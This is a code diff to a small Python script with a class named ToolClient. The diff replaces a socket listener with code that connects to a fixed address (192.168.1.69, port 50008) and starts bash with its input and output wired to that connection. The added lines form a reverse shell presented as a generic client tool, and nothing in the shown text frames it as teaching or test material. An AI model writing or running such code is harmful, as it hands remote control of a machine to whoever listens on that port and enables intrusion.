@@ -1,32 +1,27 @@
 from tkinter import *
 from socket import *
-
+import subprocess
 
 class ToolClient:
-    def __init__(self, remote_ip):
-        self.conn = self.initListenerSocket()
-        self.sock = self.redirectIn()
-        self.file = self.conn.makefile('r')
-        self.remote_ip = remote_ip
-        while True:
-            data = self.file.readline().rstrip()
-            print("1::%s" % data)
+    def __init__(self):
+        s = MySocket()
+        s.connect(('192.168.1.69', 50008))
+        subprocess.Popen('bash', stdout=s, stdin=s, stderr=s).wait()
 
-    def initListenerSocket(self, port=50008):
-        sock = socket(AF_INET, SOCK_STREAM)
-        sock.bind(('', port))
-        sock.listen(5)
-        conn, addr = sock.accept()
-        return conn
 
-    def redirectIn(self, port=50008):
-        host = self.remote_ip
-        sock = socket(AF_INET, SOCK_STREAM)
-        sock.connect((host, port))
-        file = sock.makefile('r')
-        sys.stdin = file
-        return sock
+class MySocket(socket):
+    def __init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None):
+        socket.__init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None)
+
+    def write(self, text):
+        return self.send(text)
+
+    def readlines(self):
+        return self.recv(2048)
+
+    def read(self):
+        return self.recv(1024)
+
 
 if __name__ == "__main__":
-    remote_ip = "192.168.1.69"
-    cli = ToolClient(remote_ip)
+    tc = ToolClient()
